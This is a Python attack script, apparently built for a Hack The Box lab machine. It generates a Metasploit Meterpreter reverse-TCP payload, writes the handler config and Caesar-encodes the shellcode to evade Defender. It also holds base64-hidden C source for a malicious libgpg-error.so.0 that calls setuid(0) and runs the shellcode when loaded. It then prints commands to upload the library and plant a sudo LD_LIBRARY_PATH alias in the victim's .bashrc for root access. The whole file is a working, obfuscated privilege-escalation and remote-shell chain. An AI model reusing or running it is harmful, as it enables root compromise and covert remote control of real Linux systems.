import os,sys
import base64
import argparse
from random import choice

stage_encoding = "0" #"0" #"1"

def rand_word():
    lines = open('words.txt').read().splitlines()
    string1 = choice(lines)
    string2 = choice(lines)
    string3 = choice(lines)
    res = string1 + string2 + string3
    res = res.capitalize()
    return res

def copy(runfilename,payfilepath,payfilename):
    os.system("cp %s %s%s" % (runfilename,payfilepath,payfilename))
    print ('[+] %s copied to %s%s' % (runfilename,payfilepath,payfilename))
    pass

def resourcefile(msf_payload,lhost,lport,bitness):
    rcfilename = "linux.rc"
    with open(rcfilename,'w') as f:
        f.write("use exploit/multi/handler" + "\n")
        f.write("set payload %s\n" % msf_payload)
        f.write("set lhost %s\n" % lhost)
        f.write("set lport %s\n" % lport)
        if stage_encoding == "1":
            f.write("set EnableStageEncoding true\n")
            if bitness == "64": 
                f.write("set StageEncoder x64/zutto_dekiru\n") # only if x64
                print('[!] warning: "StageEncoder x64/zutto_dekiru" in use')
        f.write("run\n")
    f.close()
    print ('[+] msf resource script written: %s -> use:\nsudo msfconsole -r %s [or] resource %s' % (rcfilename,rcfilename,rcfilename))
    pass

def genlinux(lhost,lport,bitness,pformat):
    msf_payload = "linux/x64/meterpreter/reverse_tcp"
    if bitness == "32":
        msf_payload = "linux/meterpreter/reverse_tcp"
    cmd = "msfvenom -p "+msf_payload+" LHOST="+lhost+" LPORT="+lport+" EXITFUNC=thread -f "+pformat+" -o met"+bitness+"."+pformat+""
    os.system(cmd)
    #print (cmd)
    print ('[+] met generated: lhost %s, lport %s, bitness %s, format %s' % (lhost,lport,bitness,pformat))
    print ('[!] msfvenom: %s' % cmd)
    resourcefile(msf_payload,lhost,lport,bitness)
    pass

def bxor(b1, b2):
    res = bytes([_a ^ _b for _a, _b in zip(b1, b2)])
    res = "{:02x}".format(ord(res))
    res = "\\x" + res
    return res

def bcaesar(b1,b2):
    res = b1 + b2
    res = int(res)
    res = res & 0xff
    res = hex(res).split('x')[-1]
    if len(res) == 1:
        res = "0" + res
    #print((res))
    return res

#tmp = int("ff",16) #ff #48
#key = int(8)
#bcaesar(tmp,key)

def caesar_buffer_c(bufferstring):
    '''
    int main (int argc, char **argv)
    {
        //caesar with key '+8'
        int caesar_key = 8;
        int payload_length = (int) sizeof(buf);

        for (int i=0; i<payload_length; i++)
        {
            printf("\\x%02X",(buf[i] + caesar_key) & 0xFF);
        }
        return 0;
    }
    '''
    m = bufferstring.split("\n")
    #print(m)
    mheader = "unsigned char buf[] =\n"
    mpayload = m[1:-1]
    mtail = "\";\n"
    #print (mheader)
    #print (mpayload)
    mbytes = []
    for nbytes in mpayload:
        nbytes = nbytes[1:-1]
        nbytes = nbytes.split('\\x')[1:]
        nbytes = [x.strip() for x in nbytes]
        nbytes = [x.replace('"','') for x in nbytes]
        for obyte in nbytes:
            mbytes.append(obyte)
        #print (nbytes)
    #print (mbytes)
    mres = []
    #xorkey = bytes.fromhex("fa")
    caesarkey = 8
    count = 1
    for byte in mbytes:
        #print (byte)
        tmp = byte
        #print (tmp)
        if len(tmp) == 1:
            tmp = "0" + tmp
        #print (tmp)
        #tmp = bytes.fromhex(tmp)
        tmp = int(tmp,16)
        #res = bxor(tmp,xorkey)
        res = bcaesar(tmp,caesarkey)
        res = "\\x%s" % res
        #print(res)
        if count == 1:
            res = "\"" + res
        if count == 15:
            res = res + "\"\n" #.decode('iso8859-1') #.encode('ASCII') #'latin1'
            count = 0
        count += 1
        mres.append(res)
    #print (mres)
    msfres = "".join(mres)
    buflen = len(mres)
    mheader = mheader #% str(buflen)
    msfres = mheader + msfres + mtail#'''
    #print (msfres)
    return msfres
    pass

def writehaxtop(bitness,lhost,lport,shcmd):
    haxfilename = "haxtop.c"

    if shcmd == "0":
        upper = "I2RlZmluZSBfR05VX1NPVVJDRQojaW5jbHVkZSA8c3lzL21tYW4uaD4gLy8gZm9yIG1wcm90ZWN0CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxkbGZjbi5oPgojaW5jbHVkZSA8dW5pc3RkLmg+CgpzdGF0aWMgaW50IHJ1bm1haHBheWxvYWQoKSBfX2F0dHJpYnV0ZV9fKChjb25zdHJ1Y3RvcikpOwoKaW50IGdwZ3J0X29uY2xvc2U7CmludCBfZ3BncnRfcHV0Y19vdmVyZmxvdzsKaW50IGdwZ3J0X2Zlb2ZfdW5sb2NrZWQ7CmludCBncGdydF92YnNwcmludGY7CmludCBncGdydF91bmdldGM7CmludCBncGdfZXJyX2luaXQ7CmludCBncGdydF90bXBmaWxlOwppbnQgZ3BncnRfZnB1dHNfdW5sb2NrZWQ7CmludCBncGdydF9mdGVsbG87CmludCBncGdydF9mbG9ja2ZpbGU7CmludCBncGdydF9nZXRfc3lzY2FsbF9jbGFtcDsKaW50IGdwZ19lcnJfY29kZV9mcm9tX2Vycm5vOwppbnQgZ3BncnRfY2xlYXJlcnI7CmludCBncGdfZXJyb3JfY2hlY2tfdmVyc2lvbjsKaW50IGdwZ3J0X3ZmcHJpbnRmOwppbnQgZ3BncnRfb3BhcXVlX3NldDsKaW50IGdwZ3J0X3Zhc3ByaW50ZjsKaW50IGdwZ3J0X2ZwcmludGZfdW5sb2NrZWQ7CmludCBncGdydF9sb2NrX2luaXQ7CmludCBncGdydF9mdGVsbDsKaW50IGdwZ3J0X2ZzZWVrbzsKaW50IGdwZ3J0X3N5c2hkOwppbnQgZ3BncnRfY2hlY2tfdmVyc2lvbjsKaW50IGdwZ3J0X3NldHZidWY7CmludCBncGdydF9mdHJ5bG9ja2ZpbGU7CmludCBncGdydF9sb2NrX2Rlc3Ryb3k7CmludCBncGdydF9mbmFtZV9zZXQ7CmludCBncGdydF9ic3ByaW50ZjsKaW50IF9ncGdydF9zZXRfc3RkX2ZkOwppbnQgX2dwZ3J0X3BlbmRpbmdfdW5sb2NrZWQ7CmludCBncGdydF9mY2xvc2Vfc25hdGNoOwppbnQgZ3BncnRfZndyaXRlOwppbnQgZ3BncnRfZnNlZWs7CmludCBfZ3BncnRfZ2V0X3N0ZF9zdHJlYW07CmludCBncGdfZXJyX2NvZGVfZnJvbV9zeXNlcnJvcjsKaW50IGdwZ3J0X2FzcHJpbnRmOwppbnQgZ3BnX2Vycl9jb2RlX3RvX2Vycm5vOwppbnQgZ3BncnRfZnJlZTsKaW50IGdwZ3J0X3N5c2hkX3VubG9ja2VkOwppbnQgZ3BncnRfc2V0X25vbmJsb2NrOwppbnQgZ3BncnRfZnJlYWQ7CmludCBncGdydF9mZG9wZW5fbmM7CmludCBncGdydF9vcGFxdWVfZ2V0OwppbnQgZ3BncnRfZm9wZW5tZW07CmludCBncGdydF9sb2NrX3VubG9jazsKaW50IGdwZ19lcnJfZGVpbml0OwppbnQgZ3BncnRfYjY0ZGVjX3N0YXJ0OwppbnQgZ3BncnRfYjY0ZGVjX2ZpbmlzaDsKaW50IGdwZ3J0X2ZuYW1lX2dldDsKaW50IGdwZ3J0X2Zwb3BlbjsKaW50IGdwZ3J0X2ZwdXRjOwppbnQgZ3BncnRfc25wcmludGY7CmludCBncGdydF9sb2NrX3RyeWxvY2s7CmludCBncGdydF9mZ2V0YzsKaW50IGdwZ19zdHJlcnJvcjsKaW50IGdwZ3J0X2ZvcGVuY29va2llOwppbnQgZ3BncnRfZmlsZW5vX3VubG9ja2VkOwppbnQgZ3BncnRfdmZwcmludGZfdW5sb2NrZWQ7CmludCBncGdydF95aWVsZDsKaW50IGdwZ3J0X3dyaXRlOwppbnQgZ3BncnRfcHJpbnRmX3VubG9ja2VkOwppbnQgZ3BncnRfZmNsb3NlOwppbnQgZ3BncnRfZmRvcGVuOwppbnQgZ3BncnRfZnBvcGVuX25jOwppbnQgX2dwZ3J0X2dldGNfdW5kZXJmbG93OwppbnQgZ3BncnRfc2V0X3N5c2NhbGxfY2xhbXA7CmludCBncGdydF9mcHV0czsKaW50IGdwZ3J0X3ZzbnByaW50ZjsKaW50IGdwZ3J0X2ZnZXRzOwppbnQgZ3BncnRfd3JpdGVfc2FuaXRpemVkOwppbnQgZ3BncnRfZmlsZW5vOwppbnQgZ3BncnRfc2V0X2JpbmFyeTsKaW50IGdwZ3J0X2xvY2tfbG9jazsKaW50IGdwZ3J0X3dyaXRlX2hleHN0cmluZzsKaW50IGdwZ3J0X2dldGxpbmU7CmludCBncGdydF9mb3Blbm1lbV9pbml0OwppbnQgZ3BncnRfcHJpbnRmOwppbnQgZ3BncnRfZnJlb3BlbjsKaW50IGdwZ19zdHJzb3VyY2U7CmludCBncGdfZXJyX3NldF9lcnJubzsKaW50IGdwZ3J0X3N5c29wZW5fbmM7CmludCBncGdydF9yZXdpbmQ7CmludCBncGdydF9zZXRidWY7CmludCBncGdydF9mZXJyb3JfdW5sb2NrZWQ7CmludCBncGdydF9tb3BlbjsKaW50IGdwZ3J0X3JlYWRfbGluZTsKaW50IGdwZ3J0X2Zlb2Y7CmludCBncGdydF9zeXNvcGVuOwppbnQgZ3BncnRfc2V0X2FsbG9jX2Z1bmM7CmludCBncGdydF9mdW5sb2NrZmlsZTsKaW50IGdwZ3J0X3JlYWQ7CmludCBncGdydF9mb3BlbjsKaW50IF9ncGdydF9wZW5kaW5nOwppbnQgZ3BncnRfY2xlYXJlcnJfdW5sb2NrZWQ7CmludCBncGdydF9nZXRfbm9uYmxvY2s7CmludCBncGdfc3RyZXJyb3JfcjsKaW50IGdwZ3J0X2I2NGRlY19wcm9jOwppbnQgZ3BncnRfZmVycm9yOwppbnQgZ3BncnRfZnByaW50ZjsKaW50IGdwZ3J0X2ZmbHVzaDsKaW50IGdwZ3J0X3BvbGw7CgoKaW50IHJ1bm1haHBheWxvYWQoKQp7CiAgICAvL3N1ZG8gbXNmdmVub20gLXAgbGludXgveDY0L21ldGVycHJldGVyL3JldmVyc2VfdGNwIGxob3N0PTEwLjEwLjE0LjMxIGxwb3J0PTQ0MyBleGl0ZnVuYz10aHJlYWQgLWYgYyAtbyBtZXQ2NC5jCiAgICAvL2NhZXNhciB3aXRoIGtleSAiKzgi"
        lower = "ICAgIGlmIChmb3JrKCkgPT0gMCkKICAgIHsKICAgICAgICBzZXR1aWQoMCk7CiAgICAgICAgc2V0Z2lkKDApOwogICAgICAgIAogICAgICAgIHByaW50ZigiaG9sYTFcbiIpOwogICAgICAgIGludHB0cl90IHBhZ2VzaXplID0gc3lzY29uZihfU0NfUEFHRVNJWkUpOwogICAgICAgIHByaW50ZigicGFnZXNpemU6ICVsZFxuIixwYWdlc2l6ZSk7CiAgICAgICAgaW50cHRyX3QgYnVmYWRkciA9IChpbnRwdHJfdClidWYgJiB+KHBhZ2VzaXplIC0gMSk7CiAgICAgICAgcHJpbnRmKCJidWZhZGRyOiAlbGRcbiIsYnVmYWRkcik7CiAgICAgICAgLy9tcHJvdGVjdCgodm9pZCAqKSgoKGludHB0cl90KWJ1ZikgJiB+KHBhZ2VzaXplIC0gMSkpLCBwYWdlc2l6ZSwgUFJPVF9SRUFEfFBST1RfRVhFQyk7CiAgICAgICAgaWYgKG1wcm90ZWN0KCh2b2lkICopKCgoaW50cHRyX3QpYnVmKSAmIH4ocGFnZXNpemUgLSAxKSksIHBhZ2VzaXplLCBQUk9UX1JFQUR8UFJPVF9XUklURXxQUk9UX0VYRUMpKSAKICAgICAgICB7CiAgICAgICAgICAgIHBlcnJvcigibXByb3RlY3QiKTsKICAgICAgICAgICAgcmV0dXJuIC0xOwogICAgICAgIH0KICAgICAgICAvL2RlY29kZSBzaGVsbGNvZGUgYWNjb3JkaW5nbHkgKHhvciBvciBjYWVzYXIpCiAgICAgICAgLy9jaGFyIHhvcl9rZXkgPSAnSic7CiAgICAgICAgaW50IGNhZXNhcl9rZXkgPSA4OwogICAgICAgIGludCBhcnJheXNpemUgPSAoaW50KSBzaXplb2YoYnVmKTsKICAgICAgICBwcmludGYoImRlY29kaW5nIHNoZWxsY29kZSAxXG4iKTsKICAgICAgICBmb3IgKGludCBpPTA7IGk8YXJyYXlzaXplLTE7IGkrKykgCiAgICAgICAgewogICAgICAgICAgICAvL2J1ZltpXSA9IGJ1ZltpXV54b3Jfa2V5OwogICAgICAgICAgICBidWZbaV0gPSAoYnVmW2ldIC0gY2Flc2FyX2tleSkgJiAweEZGOwogICAgICAgIH0KICAgICAgICBwcmludGYoInJ1bm5pbmcgc2hlbGxjb2RlXG4iKTsKICAgICAgICAvL3J1biBvdXIgc2hlbGxjb2RlCiAgICAgICAgaW50ICgqcmV0KSgpID0gKGludCgqKSgpKWJ1ZjsKICAgICAgICByZXQoKTsKICAgIH0KICAgIGVsc2UgCiAgICB7CiAgICAgICAgcHJpbnRmKCJIQUNLOiByZXR1cm5pbmcgZnJvbSBmdW5jdGlvbi4uLlxuIik7CiAgICAgICAgcmV0dXJuIC0xOwogICAgfQogICAgcHJpbnRmKCJIQUNLOiBSZXR1cm5pbmcgZnJvbSBtYWluLi4uXG4iKTsgCiAgICByZXR1cm4gLTI7Cn0="

        msffilename = "met%s.c" % (bitness)
        m = open(msffilename,'r')
        msf = m.read()
        m.close()
        #print(msf)
        msf = caesar_buffer_c(msf) # 5/26 -defender
        #print(msf) 

    if shcmd != "0":
        print('[+] shcmd: %s' % shcmd)
        upper = "I2RlZmluZSBfR05VX1NPVVJDRQojaW5jbHVkZSA8c3lzL21tYW4uaD4gLy8gZm9yIG1wcm90ZWN0CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxkbGZjbi5oPgojaW5jbHVkZSA8dW5pc3RkLmg+CgpzdGF0aWMgaW50IHJ1bm1haHBheWxvYWQoKSBfX2F0dHJpYnV0ZV9fKChjb25zdHJ1Y3RvcikpOwoKaW50IGdwZ3J0X29uY2xvc2U7CmludCBfZ3BncnRfcHV0Y19vdmVyZmxvdzsKaW50IGdwZ3J0X2Zlb2ZfdW5sb2NrZWQ7CmludCBncGdydF92YnNwcmludGY7CmludCBncGdydF91bmdldGM7CmludCBncGdfZXJyX2luaXQ7CmludCBncGdydF90bXBmaWxlOwppbnQgZ3BncnRfZnB1dHNfdW5sb2NrZWQ7CmludCBncGdydF9mdGVsbG87CmludCBncGdydF9mbG9ja2ZpbGU7CmludCBncGdydF9nZXRfc3lzY2FsbF9jbGFtcDsKaW50IGdwZ19lcnJfY29kZV9mcm9tX2Vycm5vOwppbnQgZ3BncnRfY2xlYXJlcnI7CmludCBncGdfZXJyb3JfY2hlY2tfdmVyc2lvbjsKaW50IGdwZ3J0X3ZmcHJpbnRmOwppbnQgZ3BncnRfb3BhcXVlX3NldDsKaW50IGdwZ3J0X3Zhc3ByaW50ZjsKaW50IGdwZ3J0X2ZwcmludGZfdW5sb2NrZWQ7CmludCBncGdydF9sb2NrX2luaXQ7CmludCBncGdydF9mdGVsbDsKaW50IGdwZ3J0X2ZzZWVrbzsKaW50IGdwZ3J0X3N5c2hkOwppbnQgZ3BncnRfY2hlY2tfdmVyc2lvbjsKaW50IGdwZ3J0X3NldHZidWY7CmludCBncGdydF9mdHJ5bG9ja2ZpbGU7CmludCBncGdydF9sb2NrX2Rlc3Ryb3k7CmludCBncGdydF9mbmFtZV9zZXQ7CmludCBncGdydF9ic3ByaW50ZjsKaW50IF9ncGdydF9zZXRfc3RkX2ZkOwppbnQgX2dwZ3J0X3BlbmRpbmdfdW5sb2NrZWQ7CmludCBncGdydF9mY2xvc2Vfc25hdGNoOwppbnQgZ3BncnRfZndyaXRlOwppbnQgZ3BncnRfZnNlZWs7CmludCBfZ3BncnRfZ2V0X3N0ZF9zdHJlYW07CmludCBncGdfZXJyX2NvZGVfZnJvbV9zeXNlcnJvcjsKaW50IGdwZ3J0X2FzcHJpbnRmOwppbnQgZ3BnX2Vycl9jb2RlX3RvX2Vycm5vOwppbnQgZ3BncnRfZnJlZTsKaW50IGdwZ3J0X3N5c2hkX3VubG9ja2VkOwppbnQgZ3BncnRfc2V0X25vbmJsb2NrOwppbnQgZ3BncnRfZnJlYWQ7CmludCBncGdydF9mZG9wZW5fbmM7CmludCBncGdydF9vcGFxdWVfZ2V0OwppbnQgZ3BncnRfZm9wZW5tZW07CmludCBncGdydF9sb2NrX3VubG9jazsKaW50IGdwZ19lcnJfZGVpbml0OwppbnQgZ3BncnRfYjY0ZGVjX3N0YXJ0OwppbnQgZ3BncnRfYjY0ZGVjX2ZpbmlzaDsKaW50IGdwZ3J0X2ZuYW1lX2dldDsKaW50IGdwZ3J0X2Zwb3BlbjsKaW50IGdwZ3J0X2ZwdXRjOwppbnQgZ3BncnRfc25wcmludGY7CmludCBncGdydF9sb2NrX3RyeWxvY2s7CmludCBncGdydF9mZ2V0YzsKaW50IGdwZ19zdHJlcnJvcjsKaW50IGdwZ3J0X2ZvcGVuY29va2llOwppbnQgZ3BncnRfZmlsZW5vX3VubG9ja2VkOwppbnQgZ3BncnRfdmZwcmludGZfdW5sb2NrZWQ7CmludCBncGdydF95aWVsZDsKaW50IGdwZ3J0X3dyaXRlOwppbnQgZ3BncnRfcHJpbnRmX3VubG9ja2VkOwppbnQgZ3BncnRfZmNsb3NlOwppbnQgZ3BncnRfZmRvcGVuOwppbnQgZ3BncnRfZnBvcGVuX25jOwppbnQgX2dwZ3J0X2dldGNfdW5kZXJmbG93OwppbnQgZ3BncnRfc2V0X3N5c2NhbGxfY2xhbXA7CmludCBncGdydF9mcHV0czsKaW50IGdwZ3J0X3ZzbnByaW50ZjsKaW50IGdwZ3J0X2ZnZXRzOwppbnQgZ3BncnRfd3JpdGVfc2FuaXRpemVkOwppbnQgZ3BncnRfZmlsZW5vOwppbnQgZ3BncnRfc2V0X2JpbmFyeTsKaW50IGdwZ3J0X2xvY2tfbG9jazsKaW50IGdwZ3J0X3dyaXRlX2hleHN0cmluZzsKaW50IGdwZ3J0X2dldGxpbmU7CmludCBncGdydF9mb3Blbm1lbV9pbml0OwppbnQgZ3BncnRfcHJpbnRmOwppbnQgZ3BncnRfZnJlb3BlbjsKaW50IGdwZ19zdHJzb3VyY2U7CmludCBncGdfZXJyX3NldF9lcnJubzsKaW50IGdwZ3J0X3N5c29wZW5fbmM7CmludCBncGdydF9yZXdpbmQ7CmludCBncGdydF9zZXRidWY7CmludCBncGdydF9mZXJyb3JfdW5sb2NrZWQ7CmludCBncGdydF9tb3BlbjsKaW50IGdwZ3J0X3JlYWRfbGluZTsKaW50IGdwZ3J0X2Zlb2Y7CmludCBncGdydF9zeXNvcGVuOwppbnQgZ3BncnRfc2V0X2FsbG9jX2Z1bmM7CmludCBncGdydF9mdW5sb2NrZmlsZTsKaW50IGdwZ3J0X3JlYWQ7CmludCBncGdydF9mb3BlbjsKaW50IF9ncGdydF9wZW5kaW5nOwppbnQgZ3BncnRfY2xlYXJlcnJfdW5sb2NrZWQ7CmludCBncGdydF9nZXRfbm9uYmxvY2s7CmludCBncGdfc3RyZXJyb3JfcjsKaW50IGdwZ3J0X2I2NGRlY19wcm9jOwppbnQgZ3BncnRfZmVycm9yOwppbnQgZ3BncnRfZnByaW50ZjsKaW50IGdwZ3J0X2ZmbHVzaDsKaW50IGdwZ3J0X3BvbGw7CgoKaW50IHJ1bm1haHBheWxvYWQoKQp7CgogICAgaWYgKGZvcmsoKSA9PSAwKQogICAgewogICAgICAgIHNldHVpZCgwKTsKICAgICAgICBzZXRnaWQoMCk7"
        lower = "ICAgIH0KICAgIGVsc2UgCiAgICB7CiAgICAgICAgcHJpbnRmKCJIQUNLOiByZXR1cm5pbmcgZnJvbSBmdW5jdGlvbi4uLlxuIik7CiAgICAgICAgcmV0dXJuIC0xOwogICAgfQogICAgcHJpbnRmKCJIQUNLOiBSZXR1cm5pbmcgZnJvbSBtYWluLi4uXG4iKTsgCiAgICByZXR1cm4gLTI7Cn0="

        msf = "system(\"%s\");" % shcmd

    with open(haxfilename,'w') as f:
        upper = base64.b64decode(upper).decode()
        lower = base64.b64decode(lower).decode()
        f.write(upper + "\n")
        f.write("    " + msf + "\n")
        f.write(lower)
    f.close()

    print('[+] haxtop c written: %s' % haxfilename)

    gpgmap = "R1BHX0VSUk9SXzEuMCB7CmdwZ3J0X29uY2xvc2U7Cl9ncGdydF9wdXRjX292ZXJmbG93OwpncGdydF9mZW9mX3VubG9ja2VkOwpncGdydF92YnNwcmludGY7CmdwZ3J0X3VuZ2V0YzsKZ3BnX2Vycl9pbml0OwpncGdydF90bXBmaWxlOwpncGdydF9mcHV0c191bmxvY2tlZDsKZ3BncnRfZnRlbGxvOwpncGdydF9mbG9ja2ZpbGU7CmdwZ3J0X2dldF9zeXNjYWxsX2NsYW1wOwpncGdfZXJyX2NvZGVfZnJvbV9lcnJubzsKZ3BncnRfY2xlYXJlcnI7CmdwZ19lcnJvcl9jaGVja192ZXJzaW9uOwpncGdydF92ZnByaW50ZjsKZ3BncnRfb3BhcXVlX3NldDsKZ3BncnRfdmFzcHJpbnRmOwpncGdydF9mcHJpbnRmX3VubG9ja2VkOwpncGdydF9sb2NrX2luaXQ7CmdwZ3J0X2Z0ZWxsOwpncGdydF9mc2Vla287CmdwZ3J0X3N5c2hkOwpncGdydF9jaGVja192ZXJzaW9uOwpncGdydF9zZXR2YnVmOwpncGdydF9mdHJ5bG9ja2ZpbGU7CmdwZ3J0X2xvY2tfZGVzdHJveTsKZ3BncnRfZm5hbWVfc2V0OwpncGdydF9ic3ByaW50ZjsKX2dwZ3J0X3NldF9zdGRfZmQ7Cl9ncGdydF9wZW5kaW5nX3VubG9ja2VkOwpncGdydF9mY2xvc2Vfc25hdGNoOwpncGdydF9md3JpdGU7CmdwZ3J0X2ZzZWVrOwpfZ3BncnRfZ2V0X3N0ZF9zdHJlYW07CmdwZ19lcnJfY29kZV9mcm9tX3N5c2Vycm9yOwpncGdydF9hc3ByaW50ZjsKZ3BnX2Vycl9jb2RlX3RvX2Vycm5vOwpncGdydF9mcmVlOwpncGdydF9zeXNoZF91bmxvY2tlZDsKZ3BncnRfc2V0X25vbmJsb2NrOwpncGdydF9mcmVhZDsKZ3BncnRfZmRvcGVuX25jOwpncGdydF9vcGFxdWVfZ2V0OwpncGdydF9mb3Blbm1lbTsKZ3BncnRfbG9ja191bmxvY2s7CmdwZ19lcnJfZGVpbml0OwpncGdydF9iNjRkZWNfc3RhcnQ7CmdwZ3J0X2I2NGRlY19maW5pc2g7CmdwZ3J0X2ZuYW1lX2dldDsKZ3BncnRfZnBvcGVuOwpncGdydF9mcHV0YzsKZ3BncnRfc25wcmludGY7CmdwZ3J0X2xvY2tfdHJ5bG9jazsKZ3BncnRfZmdldGM7CmdwZ19zdHJlcnJvcjsKZ3BncnRfZm9wZW5jb29raWU7CmdwZ3J0X2ZpbGVub191bmxvY2tlZDsKZ3BncnRfdmZwcmludGZfdW5sb2NrZWQ7CmdwZ3J0X3lpZWxkOwpncGdydF93cml0ZTsKZ3BncnRfcHJpbnRmX3VubG9ja2VkOwpncGdydF9mY2xvc2U7CmdwZ3J0X2Zkb3BlbjsKZ3BncnRfZnBvcGVuX25jOwpfZ3BncnRfZ2V0Y191bmRlcmZsb3c7CmdwZ3J0X3NldF9zeXNjYWxsX2NsYW1wOwpncGdydF9mcHV0czsKZ3BncnRfdnNucHJpbnRmOwpncGdydF9mZ2V0czsKZ3BncnRfd3JpdGVfc2FuaXRpemVkOwpncGdydF9maWxlbm87CmdwZ3J0X3NldF9iaW5hcnk7CmdwZ3J0X2xvY2tfbG9jazsKZ3BncnRfd3JpdGVfaGV4c3RyaW5nOwpncGdydF9nZXRsaW5lOwpncGdydF9mb3Blbm1lbV9pbml0OwpncGdydF9wcmludGY7CmdwZ3J0X2ZyZW9wZW47CmdwZ19zdHJzb3VyY2U7CmdwZ19lcnJfc2V0X2Vycm5vOwpncGdydF9zeXNvcGVuX25jOwpncGdydF9yZXdpbmQ7CmdwZ3J0X3NldGJ1ZjsKZ3BncnRfZmVycm9yX3VubG9ja2VkOwpncGdydF9tb3BlbjsKZ3BncnRfcmVhZF9saW5lOwpncGdydF9mZW9mOwpncGdydF9zeXNvcGVuOwpncGdydF9zZXRfYWxsb2NfZnVuYzsKZ3BncnRfZnVubG9ja2ZpbGU7CmdwZ3J0X3JlYWQ7CmdwZ3J0X2ZvcGVuOwpfZ3BncnRfcGVuZGluZzsKZ3BncnRfY2xlYXJlcnJfdW5sb2NrZWQ7CmdwZ3J0X2dldF9ub25ibG9jazsKZ3BnX3N0cmVycm9yX3I7CmdwZ3J0X2I2NGRlY19wcm9jOwpncGdydF9mZXJyb3I7CmdwZ3J0X2ZwcmludGY7CmdwZ3J0X2ZmbHVzaDsKZ3BncnRfcG9sbDsgICAgCn07"
    gpgmapfilename = "gpg.map"
    with open(gpgmapfilename,'w') as f:
        gpgmap = base64.b64decode(gpgmap).decode()
        f.write(gpgmap + "\n")
    f.close()

    print('[+] gpg.map written: %s' % gpgmapfilename)

    return haxfilename
    pass

def makehaxtop(bitness,lhost,lport,shcmd):
    if shcmd == "0":
        genlinux(lhost,lport,bitness,"c")
    haxfilename = writehaxtop(bitness,lhost,lport,shcmd)
    haxfilenamereal = haxfilename.split(".")[0].strip()

    targethomedir = "/home/reader/"
    targetlibdir = "%sldlib/" % targethomedir
    targetlibname = "libgpg-error.so.0"


    compilebin = "gcc -Wall -fPIC -z execstack -c -o %s.o %s.c" % (haxfilenamereal,haxfilenamereal)
    compiledll = "gcc -shared -Wl,--version-script gpg.map -o %s %s.o -ldl" % (targetlibname,haxfilenamereal)
    os.system(compilebin)
    os.system(compiledll)
    print('[+] %s compiled: %s' % (targetlibname,targetlibname))

    # switch SSH target accordingly!
    scpcmd = "scp -i ~/htb/labs/book/ssh/reader.pem ./%s reader@book.htb:/home/reader/" % targetlibname
    print('[+] upload:\nupload %s' % targetlibname)
    print(scpcmd)

    loadcmd = "echo 'alias sudo=\"sudo LD_LIBRARY_PATH=%s\"' >> %s.bashrc" % (targetlibdir,targethomedir)
    sourcecmd = "source %s.bashrc" % targethomedir
    exportcmd = "mkdir %s\nmv %s %s\nexport LD_LIBRARY_PATH=%s" % (targetlibdir,targetlibname,targetlibdir,targetlibdir)
    print('[+] setup on victim:')
    print(loadcmd)
    print(sourcecmd)
    print(exportcmd)

    usagecmd = "sudo top"
    print('[+] evil usage:')
    print(usagecmd)

    cleanupcmd = "unset LD_LIBRARY_PATH"
    print('[+] cleanup:')
    print(cleanupcmd)

    pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--arch','-a',required=True,dest='arch',help='32 or 64')
    parser.add_argument('--lhost','-l',required=True,dest='host',help='lhost')
    parser.add_argument('--lport','-p',required=True,dest='port',help='lport')
    parser.add_argument('--cmd','-c',required=False,dest='shcmd',help='shell command')
    args = parser.parse_args()
    
    bitness = args.arch
    lhost = args.host
    lport = args.port
    shcmd = args.shcmd

    if shcmd == None:
        shcmd = "0"

    #writehaxtop(bitness,lhost,lport,shcmd)
    makehaxtop(bitness,lhost,lport,shcmd)